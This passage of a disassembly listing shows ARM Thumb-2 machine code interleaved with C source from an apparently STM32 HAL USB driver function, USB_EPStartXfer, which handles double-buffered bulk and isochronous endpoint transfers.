 8006fd2:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006fd4:	881b      	ldrh	r3, [r3, #0]
 8006fd6:	b29a      	uxth	r2, r3
 8006fd8:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 8006fdc:	b29b      	uxth	r3, r3
 8006fde:	029b      	lsls	r3, r3, #10
 8006fe0:	b29b      	uxth	r3, r3
 8006fe2:	4313      	orrs	r3, r2
 8006fe4:	b29b      	uxth	r3, r3
 8006fe6:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8006fea:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8006fee:	b29a      	uxth	r2, r3
 8006ff0:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8006ff2:	801a      	strh	r2, [r3, #0]
 8006ff4:	e056      	b.n	80070a4 <USB_EPStartXfer+0x6a6>
 8006ff6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8006ffa:	2b00      	cmp	r3, #0
 8006ffc:	d10a      	bne.n	8007014 <USB_EPStartXfer+0x616>
 8006ffe:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007000:	881b      	ldrh	r3, [r3, #0]
 8007002:	b29b      	uxth	r3, r3
 8007004:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007008:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800700c:	b29a      	uxth	r2, r3
 800700e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007010:	801a      	strh	r2, [r3, #0]
 8007012:	e047      	b.n	80070a4 <USB_EPStartXfer+0x6a6>
 8007014:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007018:	085b      	lsrs	r3, r3, #1
 800701a:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 800701e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007022:	f003 0301 	and.w	r3, r3, #1
 8007026:	2b00      	cmp	r3, #0
 8007028:	d004      	beq.n	8007034 <USB_EPStartXfer+0x636>
 800702a:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800702e:	3301      	adds	r3, #1
 8007030:	f8c7 30f8 	str.w	r3, [r7, #248]	; 0xf8
 8007034:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8007036:	881b      	ldrh	r3, [r3, #0]
 8007038:	b29a      	uxth	r2, r3
 800703a:	f8d7 30f8 	ldr.w	r3, [r7, #248]	; 0xf8
 800703e:	b29b      	uxth	r3, r3
 8007040:	029b      	lsls	r3, r3, #10
 8007042:	b29b      	uxth	r3, r3
 8007044:	4313      	orrs	r3, r2
 8007046:	b29a      	uxth	r2, r3
 8007048:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800704a:	801a      	strh	r2, [r3, #0]
 800704c:	e02a      	b.n	80070a4 <USB_EPStartXfer+0x6a6>
 800704e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007052:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007056:	681b      	ldr	r3, [r3, #0]
 8007058:	785b      	ldrb	r3, [r3, #1]
 800705a:	2b01      	cmp	r3, #1
 800705c:	d122      	bne.n	80070a4 <USB_EPStartXfer+0x6a6>
 800705e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007062:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007066:	681b      	ldr	r3, [r3, #0]
 8007068:	653b      	str	r3, [r7, #80]	; 0x50
 800706a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800706e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007072:	681b      	ldr	r3, [r3, #0]
 8007074:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007078:	b29b      	uxth	r3, r3
 800707a:	461a      	mov	r2, r3
 800707c:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 800707e:	4413      	add	r3, r2
 8007080:	653b      	str	r3, [r7, #80]	; 0x50
 8007082:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007086:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800708a:	681b      	ldr	r3, [r3, #0]
 800708c:	781b      	ldrb	r3, [r3, #0]
 800708e:	00da      	lsls	r2, r3, #3
 8007090:	6d3b      	ldr	r3, [r7, #80]	; 0x50
 8007092:	4413      	add	r3, r2
 8007094:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007098:	64fb      	str	r3, [r7, #76]	; 0x4c
 800709a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800709e:	b29a      	uxth	r2, r3
 80070a0:	6cfb      	ldr	r3, [r7, #76]	; 0x4c
 80070a2:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr0;
 80070a4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070a8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070ac:	681b      	ldr	r3, [r3, #0]
 80070ae:	891b      	ldrh	r3, [r3, #8]
 80070b0:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80070b4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070b8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070bc:	681b      	ldr	r3, [r3, #0]
 80070be:	6959      	ldr	r1, [r3, #20]
 80070c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070c4:	b29b      	uxth	r3, r3
 80070c6:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80070ca:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80070ce:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80070d2:	6800      	ldr	r0, [r0, #0]
 80070d4:	f001 f99f 	bl	8008416 <USB_WritePMA>
            ep->xfer_buff += len;
 80070d8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070dc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070e0:	681b      	ldr	r3, [r3, #0]
 80070e2:	695a      	ldr	r2, [r3, #20]
 80070e4:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80070e8:	441a      	add	r2, r3
 80070ea:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070ee:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070f2:	681b      	ldr	r3, [r3, #0]
 80070f4:	615a      	str	r2, [r3, #20]

            if (ep->xfer_len_db > ep->maxpacket)
 80070f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80070fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80070fe:	681b      	ldr	r3, [r3, #0]
 8007100:	6a1a      	ldr	r2, [r3, #32]
 8007102:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007106:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800710a:	681b      	ldr	r3, [r3, #0]
 800710c:	691b      	ldr	r3, [r3, #16]
 800710e:	429a      	cmp	r2, r3
 8007110:	d90f      	bls.n	8007132 <USB_EPStartXfer+0x734>
            {
              ep->xfer_len_db -= len;
 8007112:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007116:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800711a:	681b      	ldr	r3, [r3, #0]
 800711c:	6a1a      	ldr	r2, [r3, #32]
 800711e:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007122:	1ad2      	subs	r2, r2, r3
 8007124:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007128:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800712c:	681b      	ldr	r3, [r3, #0]
 800712e:	621a      	str	r2, [r3, #32]
 8007130:	e00e      	b.n	8007150 <USB_EPStartXfer+0x752>
            }
            else
            {
              len = ep->xfer_len_db;
 8007132:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007136:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800713a:	681b      	ldr	r3, [r3, #0]
 800713c:	6a1b      	ldr	r3, [r3, #32]
 800713e:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
              ep->xfer_len_db = 0U;
 8007142:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007146:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800714a:	681b      	ldr	r3, [r3, #0]
 800714c:	2200      	movs	r2, #0
 800714e:	621a      	str	r2, [r3, #32]
            }

            /* Set the Double buffer counter for pmabuffer1 */
            PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 8007150:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007154:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007158:	681b      	ldr	r3, [r3, #0]
 800715a:	643b      	str	r3, [r7, #64]	; 0x40
 800715c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007160:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007164:	681b      	ldr	r3, [r3, #0]
 8007166:	785b      	ldrb	r3, [r3, #1]
 8007168:	2b00      	cmp	r3, #0
 800716a:	d177      	bne.n	800725c <USB_EPStartXfer+0x85e>
 800716c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007170:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007174:	681b      	ldr	r3, [r3, #0]
 8007176:	63bb      	str	r3, [r7, #56]	; 0x38
 8007178:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800717c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007180:	681b      	ldr	r3, [r3, #0]
 8007182:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007186:	b29b      	uxth	r3, r3
 8007188:	461a      	mov	r2, r3
 800718a:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 800718c:	4413      	add	r3, r2
 800718e:	63bb      	str	r3, [r7, #56]	; 0x38
 8007190:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007194:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007198:	681b      	ldr	r3, [r3, #0]
 800719a:	781b      	ldrb	r3, [r3, #0]
 800719c:	00da      	lsls	r2, r3, #3
 800719e:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 80071a0:	4413      	add	r3, r2
 80071a2:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80071a6:	637b      	str	r3, [r7, #52]	; 0x34
 80071a8:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071aa:	881b      	ldrh	r3, [r3, #0]
 80071ac:	b29b      	uxth	r3, r3
 80071ae:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80071b2:	b29a      	uxth	r2, r3
 80071b4:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071b6:	801a      	strh	r2, [r3, #0]
 80071b8:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071bc:	2b3e      	cmp	r3, #62	; 0x3e
 80071be:	d921      	bls.n	8007204 <USB_EPStartXfer+0x806>
 80071c0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071c4:	095b      	lsrs	r3, r3, #5
 80071c6:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071ca:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80071ce:	f003 031f 	and.w	r3, r3, #31
 80071d2:	2b00      	cmp	r3, #0
 80071d4:	d104      	bne.n	80071e0 <USB_EPStartXfer+0x7e2>
 80071d6:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80071da:	3b01      	subs	r3, #1
 80071dc:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 80071e0:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 80071e2:	881b      	ldrh	r3, [r3, #0]
 80071e4:	b29a      	uxth	r2, r3
 80071e6:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 80071ea:	b29b      	uxth	r3, r3
 80071ec:	029b      	lsls	r3, r3, #10
 80071ee:	b29b      	uxth	r3, r3
 80071f0:	4313      	orrs	r3, r2
 80071f2:	b29b      	uxth	r3, r3
 80071f4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80071f8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80071fc:	b29a      	uxth	r2, r3
 80071fe:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007200:	801a      	strh	r2, [r3, #0]
 8007202:	e050      	b.n	80072a6 <USB_EPStartXfer+0x8a8>
 8007204:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007208:	2b00      	cmp	r3, #0
 800720a:	d10a      	bne.n	8007222 <USB_EPStartXfer+0x824>
 800720c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800720e:	881b      	ldrh	r3, [r3, #0]
 8007210:	b29b      	uxth	r3, r3
 8007212:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007216:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800721a:	b29a      	uxth	r2, r3
 800721c:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 800721e:	801a      	strh	r2, [r3, #0]
 8007220:	e041      	b.n	80072a6 <USB_EPStartXfer+0x8a8>
 8007222:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007226:	085b      	lsrs	r3, r3, #1
 8007228:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 800722c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007230:	f003 0301 	and.w	r3, r3, #1
 8007234:	2b00      	cmp	r3, #0
 8007236:	d004      	beq.n	8007242 <USB_EPStartXfer+0x844>
 8007238:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 800723c:	3301      	adds	r3, #1
 800723e:	f8c7 30f4 	str.w	r3, [r7, #244]	; 0xf4
 8007242:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007244:	881b      	ldrh	r3, [r3, #0]
 8007246:	b29a      	uxth	r2, r3
 8007248:	f8d7 30f4 	ldr.w	r3, [r7, #244]	; 0xf4
 800724c:	b29b      	uxth	r3, r3
 800724e:	029b      	lsls	r3, r3, #10
 8007250:	b29b      	uxth	r3, r3
 8007252:	4313      	orrs	r3, r2
 8007254:	b29a      	uxth	r2, r3
 8007256:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8007258:	801a      	strh	r2, [r3, #0]
 800725a:	e024      	b.n	80072a6 <USB_EPStartXfer+0x8a8>
 800725c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007260:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007264:	681b      	ldr	r3, [r3, #0]
 8007266:	785b      	ldrb	r3, [r3, #1]
 8007268:	2b01      	cmp	r3, #1
 800726a:	d11c      	bne.n	80072a6 <USB_EPStartXfer+0x8a8>
 800726c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007270:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007274:	681b      	ldr	r3, [r3, #0]
 8007276:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 800727a:	b29b      	uxth	r3, r3
 800727c:	461a      	mov	r2, r3
 800727e:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007280:	4413      	add	r3, r2
 8007282:	643b      	str	r3, [r7, #64]	; 0x40
 8007284:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007288:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800728c:	681b      	ldr	r3, [r3, #0]
 800728e:	781b      	ldrb	r3, [r3, #0]
 8007290:	00da      	lsls	r2, r3, #3
 8007292:	6c3b      	ldr	r3, [r7, #64]	; 0x40
 8007294:	4413      	add	r3, r2
 8007296:	f203 4306 	addw	r3, r3, #1030	; 0x406
 800729a:	63fb      	str	r3, [r7, #60]	; 0x3c
 800729c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072a0:	b29a      	uxth	r2, r3
 80072a2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 80072a4:	801a      	strh	r2, [r3, #0]
            pmabuffer = ep->pmaaddr1;
 80072a6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072aa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072ae:	681b      	ldr	r3, [r3, #0]
 80072b0:	895b      	ldrh	r3, [r3, #10]
 80072b2:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

            /* Write the user buffer to USB PMA */
            USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 80072b6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072ba:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072be:	681b      	ldr	r3, [r3, #0]
 80072c0:	6959      	ldr	r1, [r3, #20]
 80072c2:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80072c6:	b29b      	uxth	r3, r3
 80072c8:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80072cc:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80072d0:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80072d4:	6800      	ldr	r0, [r0, #0]
 80072d6:	f001 f89e 	bl	8008416 <USB_WritePMA>
 80072da:	e227      	b.n	800772c <USB_EPStartXfer+0xd2e>
          }
        }
        /* auto Switch to single buffer mode when transfer <Mps no need to manage in double buffer */
        else
        {
          len = ep->xfer_len_db;
 80072dc:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072e0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072e4:	681b      	ldr	r3, [r3, #0]
 80072e6:	6a1b      	ldr	r3, [r3, #32]
 80072e8:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104

          /* disable double buffer mode for Bulk endpoint */
          PCD_CLEAR_BULK_EP_DBUF(USBx, ep->num);
 80072ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072f0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80072f4:	681a      	ldr	r2, [r3, #0]
 80072f6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80072fa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80072fe:	681b      	ldr	r3, [r3, #0]
 8007300:	781b      	ldrb	r3, [r3, #0]
 8007302:	009b      	lsls	r3, r3, #2
 8007304:	4413      	add	r3, r2
 8007306:	881b      	ldrh	r3, [r3, #0]
 8007308:	b29b      	uxth	r3, r3
 800730a:	f423 43e2 	bic.w	r3, r3, #28928	; 0x7100
 800730e:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007312:	f8a7 3062 	strh.w	r3, [r7, #98]	; 0x62
 8007316:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800731a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800731e:	681a      	ldr	r2, [r3, #0]
 8007320:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007324:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007328:	681b      	ldr	r3, [r3, #0]
 800732a:	781b      	ldrb	r3, [r3, #0]
 800732c:	009b      	lsls	r3, r3, #2
 800732e:	441a      	add	r2, r3
 8007330:	f8b7 3062 	ldrh.w	r3, [r7, #98]	; 0x62
 8007334:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007338:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800733c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007340:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8007344:	b29b      	uxth	r3, r3
 8007346:	8013      	strh	r3, [r2, #0]

          /* Set Tx count with nbre of byte to be transmitted */
          PCD_SET_EP_TX_CNT(USBx, ep->num, len);
 8007348:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800734c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007350:	681b      	ldr	r3, [r3, #0]
 8007352:	65fb      	str	r3, [r7, #92]	; 0x5c
 8007354:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007358:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800735c:	681b      	ldr	r3, [r3, #0]
 800735e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007362:	b29b      	uxth	r3, r3
 8007364:	461a      	mov	r2, r3
 8007366:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 8007368:	4413      	add	r3, r2
 800736a:	65fb      	str	r3, [r7, #92]	; 0x5c
 800736c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007370:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007374:	681b      	ldr	r3, [r3, #0]
 8007376:	781b      	ldrb	r3, [r3, #0]
 8007378:	00da      	lsls	r2, r3, #3
 800737a:	6dfb      	ldr	r3, [r7, #92]	; 0x5c
 800737c:	4413      	add	r3, r2
 800737e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007382:	65bb      	str	r3, [r7, #88]	; 0x58
 8007384:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007388:	b29a      	uxth	r2, r3
 800738a:	6dbb      	ldr	r3, [r7, #88]	; 0x58
 800738c:	801a      	strh	r2, [r3, #0]
          pmabuffer = ep->pmaaddr0;
 800738e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007392:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007396:	681b      	ldr	r3, [r3, #0]
 8007398:	891b      	ldrh	r3, [r3, #8]
 800739a:	f8a7 3076 	strh.w	r3, [r7, #118]	; 0x76

          /* Write the user buffer to USB PMA */
          USB_WritePMA(USBx, ep->xfer_buff, pmabuffer, (uint16_t)len);
 800739e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073a2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073a6:	681b      	ldr	r3, [r3, #0]
 80073a8:	6959      	ldr	r1, [r3, #20]
 80073aa:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073ae:	b29b      	uxth	r3, r3
 80073b0:	f8b7 2076 	ldrh.w	r2, [r7, #118]	; 0x76
 80073b4:	f507 7084 	add.w	r0, r7, #264	; 0x108
 80073b8:	f5a0 7082 	sub.w	r0, r0, #260	; 0x104
 80073bc:	6800      	ldr	r0, [r0, #0]
 80073be:	f001 f82a 	bl	8008416 <USB_WritePMA>
 80073c2:	e1b3      	b.n	800772c <USB_EPStartXfer+0xd2e>
        }
      }
      else /* manage isochronous double buffer IN mode */
      {
        /* each Time to write in PMA xfer_len_db will */
        ep->xfer_len_db -= len;
 80073c4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073c8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073cc:	681b      	ldr	r3, [r3, #0]
 80073ce:	6a1a      	ldr	r2, [r3, #32]
 80073d0:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80073d4:	1ad2      	subs	r2, r2, r3
 80073d6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073da:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073de:	681b      	ldr	r3, [r3, #0]
 80073e0:	621a      	str	r2, [r3, #32]

        /* Fill the data buffer */
        if ((PCD_GET_ENDPOINT(USBx, ep->num) & USB_EP_DTOG_TX) != 0U)
 80073e2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073e6:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 80073ea:	681a      	ldr	r2, [r3, #0]
 80073ec:	f507 7384 	add.w	r3, r7, #264	; 0x108
 80073f0:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 80073f4:	681b      	ldr	r3, [r3, #0]
 80073f6:	781b      	ldrb	r3, [r3, #0]
 80073f8:	009b      	lsls	r3, r3, #2
 80073fa:	4413      	add	r3, r2
 80073fc:	881b      	ldrh	r3, [r3, #0]
 80073fe:	b29b      	uxth	r3, r3
 8007400:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007404:	2b00      	cmp	r3, #0
 8007406:	f000 80c6 	beq.w	8007596 <USB_EPStartXfer+0xb98>
        {
          /* Set the Double buffer counter for pmabuffer1 */
          PCD_SET_EP_DBUF1_CNT(USBx, ep->num, ep->is_in, len);
 800740a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800740e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007412:	681b      	ldr	r3, [r3, #0]
 8007414:	673b      	str	r3, [r7, #112]	; 0x70
 8007416:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800741a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 800741e:	681b      	ldr	r3, [r3, #0]
 8007420:	785b      	ldrb	r3, [r3, #1]
 8007422:	2b00      	cmp	r3, #0
 8007424:	d177      	bne.n	8007516 <USB_EPStartXfer+0xb18>
 8007426:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800742a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800742e:	681b      	ldr	r3, [r3, #0]
 8007430:	66bb      	str	r3, [r7, #104]	; 0x68
 8007432:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007436:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 800743a:	681b      	ldr	r3, [r3, #0]
 800743c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007440:	b29b      	uxth	r3, r3
 8007442:	461a      	mov	r2, r3
 8007444:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 8007446:	4413      	add	r3, r2
 8007448:	66bb      	str	r3, [r7, #104]	; 0x68
 800744a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 800744e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007452:	681b      	ldr	r3, [r3, #0]
 8007454:	781b      	ldrb	r3, [r3, #0]
 8007456:	00da      	lsls	r2, r3, #3
 8007458:	6ebb      	ldr	r3, [r7, #104]	; 0x68
 800745a:	4413      	add	r3, r2
 800745c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007460:	667b      	str	r3, [r7, #100]	; 0x64
 8007462:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007464:	881b      	ldrh	r3, [r3, #0]
 8007466:	b29b      	uxth	r3, r3
 8007468:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800746c:	b29a      	uxth	r2, r3
 800746e:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 8007470:	801a      	strh	r2, [r3, #0]
 8007472:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007476:	2b3e      	cmp	r3, #62	; 0x3e
 8007478:	d921      	bls.n	80074be <USB_EPStartXfer+0xac0>
 800747a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 800747e:	095b      	lsrs	r3, r3, #5
 8007480:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 8007484:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007488:	f003 031f 	and.w	r3, r3, #31
 800748c:	2b00      	cmp	r3, #0
 800748e:	d104      	bne.n	800749a <USB_EPStartXfer+0xa9c>
 8007490:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 8007494:	3b01      	subs	r3, #1
 8007496:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 800749a:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 800749c:	881b      	ldrh	r3, [r3, #0]
 800749e:	b29a      	uxth	r2, r3
 80074a0:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074a4:	b29b      	uxth	r3, r3
 80074a6:	029b      	lsls	r3, r3, #10
 80074a8:	b29b      	uxth	r3, r3
 80074aa:	4313      	orrs	r3, r2
 80074ac:	b29b      	uxth	r3, r3
 80074ae:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074b2:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074b6:	b29a      	uxth	r2, r3
 80074b8:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074ba:	801a      	strh	r2, [r3, #0]
 80074bc:	e050      	b.n	8007560 <USB_EPStartXfer+0xb62>
 80074be:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074c2:	2b00      	cmp	r3, #0
 80074c4:	d10a      	bne.n	80074dc <USB_EPStartXfer+0xade>
 80074c6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074c8:	881b      	ldrh	r3, [r3, #0]
 80074ca:	b29b      	uxth	r3, r3
 80074cc:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80074d0:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80074d4:	b29a      	uxth	r2, r3
 80074d6:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074d8:	801a      	strh	r2, [r3, #0]
 80074da:	e041      	b.n	8007560 <USB_EPStartXfer+0xb62>
 80074dc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074e0:	085b      	lsrs	r3, r3, #1
 80074e2:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80074e6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 80074ea:	f003 0301 	and.w	r3, r3, #1
 80074ee:	2b00      	cmp	r3, #0
 80074f0:	d004      	beq.n	80074fc <USB_EPStartXfer+0xafe>
 80074f2:	f8d7 30f0 	ldr.w	r3, [r7, #240]	; 0xf0
 80074f6:	3301      	adds	r3, #1
 80074f8:	f8c7 30f0 	str.w	r3, [r7, #240]	; 0xf0
 80074fc:	6e7b      	ldr	r3, [r7, #100]	; 0x64
 80074fe:	881b      	ldrh	r3, [r3, #0]
 8007500:	b29a      	uxth	r2, r3
